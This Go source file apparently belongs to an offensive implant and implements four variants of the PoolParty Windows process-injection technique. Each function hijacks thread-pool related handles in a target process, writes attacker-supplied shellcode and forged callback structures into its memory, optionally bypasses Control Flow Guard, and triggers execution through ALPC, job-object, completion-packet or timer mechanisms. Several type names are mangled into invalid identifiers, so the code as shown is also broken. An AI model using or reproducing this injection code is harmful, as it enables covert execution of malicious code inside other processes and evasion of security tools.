//go:build windows
// +build windows

package commands

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
	hProcess, output, err := poolPartyInit(5, "port item Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %w", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
	if err != nil {
		return output, err
	}

	// Step 5: Create a temporary ALPC port for TpAllocAlpcCompletion
	var hTempAlpc uintptr
	status, _, _ := procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hTempAlpc)),
		0, // ObjectAttributes
		0, // PortAttributes
	)
	if status != 0 {
		return output, fmt.Errorf("port creation (temp) failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hTempAlpc))
	output += fmt.Sprintf("[+] Created temporary ALPC port: 0x%X\n", hTempAlpc)

	// Step 6: Allocate port item structure via TpAllocAlpcCompletion
	var pTpAlpc uintptr
	status, _, _ = procTpAllocAlpcCompletion.Call(
		uintptr(unsafe.Pointer(&pTpAlpc)),
		hTempAlpc,
		shellcodeAddr, // ALPC callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocAlpcCompletion failed: 0x%X", status)
	}
	output += "[+] Created port item structure associated with shellcode\n"

	// Explicitly set the Direct.Callback to shellcode address (similar to variant 4)
	pAlpcStruct := (*FULL_port item)(unsafe.Pointer(pTpAlpc))
	pAlpcStruct.Direct.Callback = shellcodeAddr
	output += "[+] Set Direct.Callback to shellcode address\n"

	// Step 7: Generate random ALPC port name
	portName := fmt.Sprintf("\\RPC Control\\PoolParty%d", pid)
	portNameUTF16, _ := windows.UTF16FromString(portName)

	// Create UNICODE_STRING for port name
	// Length = bytes excluding null terminator, MaximumLength = bytes including null terminator
	var usPortName UNICODE_STRING
	usPortName.Length = uint16((len(portNameUTF16) - 1) * 2)  // UTF-16 code units (minus null) * 2 bytes each
	usPortName.MaximumLength = uint16(len(portNameUTF16) * 2) // Full buffer size in bytes
	usPortName.Buffer = &portNameUTF16[0]

	// Step 8: Create the actual ALPC port with attributes
	var objAttr OBJECT_ATTRIBUTES
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
	objAttr.ObjectName = uintptr(unsafe.Pointer(&usPortName))

	var portAttr ALPC_PORT_ATTRIBUTES
	portAttr.Flags = 0x20000
	portAttr.MaxMessageLength = 328

	var hAlpc uintptr
	status, _, _ = procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hAlpc)),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
	)
	if status != 0 {
		return output, fmt.Errorf("port creation failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hAlpc))
	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)

	// Step 9: Allocate memory for port item in target process
	var tpAlpc FULL_port item
	tpAlpcAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpAlpc)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for port item failed: %w", err)
	}
	output += fmt.Sprintf("[+] Allocated port item memory at: 0x%X\n", tpAlpcAddr)

	// Step 10: Write port item to target process
	tpAlpcBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpAlpc))[:unsafe.Sizeof(tpAlpc)]
	bytesWritten, err := injectWriteMemory(hProcess, tpAlpcAddr, tpAlpcBytes)
	if err != nil {
		return output, fmt.Errorf("memory write for port item failed: %w", err)
	}
	output += fmt.Sprintf("[+] Wrote port item structure (%d bytes)\n", bytesWritten)

	// Step 11: Associate ALPC port with target's I/O completion port
	alpcAssoc := ALPC_PORT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpAlpcAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	status, _, _ = procNtAlpcSetInformation.Call(
		hAlpc,
		uintptr(AlpcAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&alpcAssoc)),
		uintptr(unsafe.Sizeof(alpcAssoc)),
	)
	if status != 0 {
		return output, fmt.Errorf("port info set failed: 0x%X", status)
	}
	output += "[+] Associated ALPC port with target's I/O completion port\n"

	// Step 12: Connect to ALPC port to trigger completion
	var hClientPort uintptr
	var clientObjAttr OBJECT_ATTRIBUTES
	clientObjAttr.Length = uint32(unsafe.Sizeof(clientObjAttr))

	// Prepare message
	message := "PoolParty ALPC trigger"
	var alpcMessage ALPC_MESSAGE
	alpcMessage.PortHeader.DataLength = uint16(len(message))
	alpcMessage.PortHeader.TotalLength = uint16(unsafe.Sizeof(alpcMessage.PortHeader)) + uint16(len(message))
	copy(alpcMessage.PortMessage[:], message)
	messageSize := uintptr(unsafe.Sizeof(alpcMessage))

	// Set timeout to 1 second to prevent blocking
	var timeout int64 = -10000000 // 1 second in 100-nanosecond intervals

	status, _, _ = procNtAlpcConnectPort.Call(
		uintptr(unsafe.Pointer(&hClientPort)),
		uintptr(unsafe.Pointer(&usPortName)),
		uintptr(unsafe.Pointer(&clientObjAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
		0x20000, // Connection flags
		0,       // RequiredServerSid
		uintptr(unsafe.Pointer(&alpcMessage)),
		uintptr(unsafe.Pointer(&messageSize)),
		0, // OutMessageAttributes
		0, // InMessageAttributes
		uintptr(unsafe.Pointer(&timeout)),
	)
	// NtAlpcConnectPort may return timeout status, which is expected
	output += "[+] Connected to ALPC port to trigger completion\n"
	output += "[+] PoolParty Variant 5 injection completed successfully\n"

	return output, nil
}

// executeVariant6 implements job item Insertion via Job object assignment
func executeVariant6(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
	hProcess, output, err := poolPartyInit(6, "job item Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %w", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
	if err != nil {
		return output, err
	}

	// Step 5: Create job object
	jobName := fmt.Sprintf("PoolPartyJob%d", pid)
	jobNameUTF16, _ := windows.UTF16PtrFromString(jobName)
	hJob, _, err := procCreateJobObjectW.Call(
		0, // Security attributes
		uintptr(unsafe.Pointer(jobNameUTF16)),
	)
	if hJob == 0 {
		return output, fmt.Errorf("CreateJobObjectW failed: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(hJob))
	output += fmt.Sprintf("[+] Created job object '%s'\n", jobName)

	// Step 6: Allocate job item structure via TpAllocJobNotification
	var pTpJob uintptr
	status, _, _ := procTpAllocJobNotification.Call(
		uintptr(unsafe.Pointer(&pTpJob)),
		hJob,
		shellcodeAddr, // Job callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocJobNotification failed: 0x%X", status)
	}
	output += "[+] Created job item structure associated with shellcode\n"

	// Step 7: Allocate memory for job item in target process
	var tpJob FULL_job item
	tpJobAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpJob)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for job item failed: %w", err)
	}
	output += fmt.Sprintf("[+] Allocated job item memory at: 0x%X\n", tpJobAddr)

	// Step 8: Write job item to target process
	tpJobBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpJob))[:unsafe.Sizeof(tpJob)]
	bytesWritten, err := injectWriteMemory(hProcess, tpJobAddr, tpJobBytes)
	if err != nil {
		return output, fmt.Errorf("memory write for job item failed: %w", err)
	}
	output += fmt.Sprintf("[+] Wrote job item structure (%d bytes)\n", bytesWritten)

	// Step 9: Zero out existing job completion info (required before re-setting)
	var zeroAssoc JOBOBJECT_ASSOCIATE_COMPLETION_PORT
	ret, _, err := procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&zeroAssoc)),
		uintptr(unsafe.Sizeof(zeroAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject (zero) failed: %w", err)
	}
	output += "[+] Zeroed out job object completion info\n"

	// Step 10: Associate job with target's I/O completion port
	jobAssoc := JOBOBJECT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpJobAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	ret, _, err = procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&jobAssoc)),
		uintptr(unsafe.Sizeof(jobAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject failed: %w", err)
	}
	output += "[+] Associated job object with target's I/O completion port\n"

	// Step 11: Assign current process to job to trigger completion
	hCurrentProcess, _, _ := procGetCurrentProcess.Call()
	ret, _, err = procAssignProcessToJobObject.Call(
		hJob,
		hCurrentProcess,
	)
	if ret == 0 {
		return output, fmt.Errorf("AssignProcessToJobObject failed: %w", err)
	}
	output += "[+] Assigned current process to job object to trigger completion\n"
	output += "[+] PoolParty Variant 6 injection completed successfully\n"

	return output, nil
}

// executeVariant7 implements direct item Insertion via I/O Completion Port
func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
	hProcess, output, err := poolPartyInit(7, "direct item Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack IoCompletion handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %w", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate and write shellcode (W^X: RW → write → RX)
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
	if err != nil {
		return output, err
	}

	// Step 4: Create and write direct item structure
	tpDirect := direct item{
		Callback: shellcodeAddr,
	}
	tpDirectBytes := (*[unsafe.Sizeof(direct item{})]byte)(unsafe.Pointer(&tpDirect))[:]

	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for direct item failed: %w", err)
	}
	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
	if err != nil {
		return output, fmt.Errorf("memory write for direct item failed: %w", err)
	}
	output += fmt.Sprintf("[+] direct item at: 0x%X\n", tpDirectAddr)

	// Step 8: Queue completion packet via ZwSetIoCompletion
	status, _, _ := procZwSetIoCompletion.Call(
		uintptr(hIoCompletion),
		tpDirectAddr, // KeyContext - pointer to direct item
		0,            // ApcContext
		0,            // IoStatus
		0,            // IoStatusInformation
	)
	if status != 0 {
		return output, fmt.Errorf("completion queue failed: 0x%X", status)
	}
	output += "[+] Queued packet to I/O completion port\n"
	output += "[+] PoolParty Variant 7 injection completed successfully\n"

	return output, nil
}

// executeVariant8 implements timer item Insertion - Variant 8
func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
	hProcess, output, err := poolPartyInit(8, "timer item Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack worker factory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack worker factory handle: %w", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Hijack IR timer handle
	hTimer, err := hijackProcessHandle(hProcess, "IRTimer", windows.TIMER_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack timer handle: %w", err)
	}
	defer windows.CloseHandle(hTimer)
	output += fmt.Sprintf("[+] Hijacked timer queue handle: 0x%X\n", hTimer)

	// Step 4: Query worker factory to get pool address
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (pool): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 5: Allocate and write shellcode (W^X: RW → write → RX)
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
	if err != nil {
		return output, err
	}

	// Step 6: Create timer item structure via CreateThreadpoolTimer
	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
		shellcodeAddr, // Timer callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpTimer == 0 {
		return output, fmt.Errorf("timer item creation failed: %w", err)
	}
	output += "[+] Created timer item structure associated with shellcode\n"

	// Step 7: Allocate memory for timer item in target process
	var tpTimer FULL_timer item
	tpTimerAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpTimer)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for timer item failed: %w", err)
	}
	output += fmt.Sprintf("[+] Allocated timer item memory at: 0x%X\n", tpTimerAddr)

	// Step 8: Cast the pointer to access the structure directly like SafeBreach does
	// SafeBreach directly modifies the structure returned by CreateThreadpoolTimer
	pTimer := (*FULL_timer item)(unsafe.Pointer(pTpTimer))

	// Step 9: Modify timer item structure for insertion
	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)

	// Set Pool pointer to target's pool
	pTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter

	// Note: CreateThreadpoolTimer should have set the Callback to shellcodeAddr already
	// SafeBreach doesn't manually set Callback - they pass it to CreateThreadpoolTimer

	// Set timer expiration
	pTimer.DueTime = timeout
	pTimer.WindowStartLinks.Key = timeout
	pTimer.WindowEndLinks.Key = timeout

	// Set up circular lists for WindowStart and WindowEnd Children only (NOT Siblings - SafeBreach doesn't set those)
	// Calculate remote addresses for the Window*Links.Children fields
	// Use dummy struct for offset calculation
	var dummyTimer FULL_timer item
	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks.Children))
	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks.Children))

	pTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
	pTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
	pTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
	pTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr

	// Step 10: Write timer item to target process
	timerBytes := (*[unsafe.Sizeof(FULL_timer item{})]byte)(unsafe.Pointer(pTpTimer))[:]
	bytesWritten, err := injectWriteMemory(hProcess, tpTimerAddr, timerBytes)
	if err != nil {
		return output, fmt.Errorf("memory write for timer item failed: %w", err)
	}
	output += fmt.Sprintf("[+] Wrote timer item structure (%d bytes)\n", bytesWritten)

	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target pool

	// Step 12: Update pool's TimerQueue WindowStart and WindowEnd roots to point to our timer
	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root

	targetTpPoolAddr := workerFactoryInfo.StartParameter

	// Calculate offsets step by step - Go doesn't handle nested offsetof well
	var dummyPool FULL_pool
	var dummyTimerQueue TPP_TIMER_QUEUE
	var dummySubQueue TPP_TIMER_SUBQUEUE

	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))

	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset

	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))

	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)

	// Write WindowStartLinks address to WindowStart.Root
	windowStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowStartLinksAddr))[:]
	_, err = injectWriteMemory(hProcess, windowStartRootAddr, windowStartBytes)
	if err != nil {
		return output, fmt.Errorf("memory write for WindowStart.Root failed: %w", err)
	}

	// Write WindowEndLinks address to WindowEnd.Root
	windowEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowEndLinksAddr))[:]
	_, err = injectWriteMemory(hProcess, windowEndRootAddr, windowEndBytes)
	if err != nil {
		return output, fmt.Errorf("memory write for WindowEnd.Root failed: %w", err)
	}
	output += "[+] Modified target process's pool timer queue to point to timer item\n"

	// Step 13: Set the timer to expire via NtSetTimer2
	var dueTime int64
	dueTime = timeout

	var params T2_SET_PARAMETERS
	status, _, _ = procNtSetTimer2.Call(
		uintptr(hTimer),
		uintptr(unsafe.Pointer(&dueTime)),
		0, // Period
		uintptr(unsafe.Pointer(&params)),
	)
	if status != 0 {
		return output, fmt.Errorf("timer set failed: 0x%X", status)
	}
	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
	output += "[+] PoolParty Variant 8 injection completed successfully\n"

	return output, nil
}
